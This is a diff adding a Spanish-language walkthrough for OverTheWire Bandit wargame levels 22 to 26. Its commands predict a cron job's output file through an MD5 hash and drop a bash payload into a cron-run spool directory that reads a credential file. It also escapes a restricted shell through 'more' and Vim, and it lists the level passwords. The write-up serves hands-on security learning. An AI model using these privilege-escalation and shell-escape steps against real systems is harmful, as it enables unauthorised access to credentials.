@@ -593,3 +593,76 @@ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 La contraseña es revelada en texto plano gracias a la ejecución automática del script.
 
 Contraseña para bandit 22: **RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz**
+
+## Bandit 22
+
+Al inspeccionar el script /usr/bin/cronjob_bandit23.sh, se descubrió que el sistema extrae la contraseña de bandit23 y la copia a la carpeta /tmp/. El nombre de este nuevo archivo se genera dinámicamente calculando el hash MD5 de la frase "I am user bandit23".
+
+Para obtener la contraseña, se replicó la lógica matemática del script original desde la terminal. Esto permitió predecir el nombre exacto del archivo oculto y leer su contenido:
+
+```bash
+# 1. Calcular el nombre del archivo (hash MD5)
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+# (Ejemplo de salida: 8ca319486bfbbc3663ea0fbe81326349)
+
+# 2. Leer el archivo temporal para obtener la flag
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+
+Contraseña Bandit 23: **gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw**
+
+## Bandit 23
+
+El script objetivo se ejecuta bajo el usuario bandit24 y está diseñado para correr automáticamente cualquier archivo ejecutable creado por bandit23 que sea depositado en el directorio *"/var/spool/bandit24/foo."*
+Se diseñó un script payload en bash para leer la contraseña del siguiente nivel y exportarla a un directorio temporal propio con permisos de escritura. Al copiarlo a la carpeta objetivo, el sistema lo ejecutó otorgando la flag:
+
+```bash
+# 1. Crear un entorno temporal propio con permisos totales
+mkdir /tmp/tomas_b24
+chmod 777 /tmp/tomas_b24
+
+# 2. Crear el script (payload) que leerá la contraseña
+echo '#!/bin/bash' > /tmp/tomas_b24/mi_script.sh
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/tomas_b24/pass' >> /tmp/tomas_b24/mi_script.sh
+
+# 3. Dar permisos de ejecución y enviarlo a la carpeta del cronjob
+chmod +x /tmp/tomas_b24/mi_script.sh
+cp /tmp/tomas_b24/mi_script.sh /var/spool/bandit24/foo
+
+# 4. Esperar la ejecución automática (máx. 1 minuto) y leer la flag
+cat /tmp/tomas_b24/pass
+```
+
+Contraseña para Bandit 24:**hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv**
+
+## Bandit 24
+El servicio exigía la contraseña actual junto con un PIN de 4 dígitos desconocido, requiriendo probar las 10,000 combinaciones posibles sin cerrar la conexión.
+
+Contraseña Bandit 25: **SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P**
+
+## Bandit 25
+
+Resolución del nivel 25 al 26 evadiendo un entorno restringido. El usuario bandit26 no tenía asignada una consola estándar (/bin/bash), sino un script (/usr/bin/showtext) que imprimía un texto mediante el comando more y forzaba la desconexión inmediata.
+
+Se aplicó la técnica de Shell Escape. Al reducir drásticamente el tamaño de la ventana de la terminal, se forzó la pausa del paginador more. Aprovechando los atajos nativos de esta herramienta, se ingresó al editor Vim, desde el cual se reconfiguró la variable de la consola para spawnear (invocar) una terminal interactiva con todos los privilegios del usuario.
+
+```bash
+# 1. Conexión SSH (requiere ventana de terminal muy pequeña para pausar el output en '--More--')
+ssh -i clave26.key bandit26@bandit.labs.overthewire.org -p 2220
+
+# 2. En el prompt de '--More--', presionar la tecla 'v' para abrir Vim.
+
+# 3. Dentro de Vim, ejecutar los comandos para escapar hacia una terminal real:
+:set shell=/bin/bash
+:sh
+
+# 4. Una vez obtenida la consola interactiva, leer la flag:
+cat /etc/bandit_pass/bandit26
+
+```
+
+Contraseña para bandit 26: **jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ**
+
+## Bandit 26
+
+
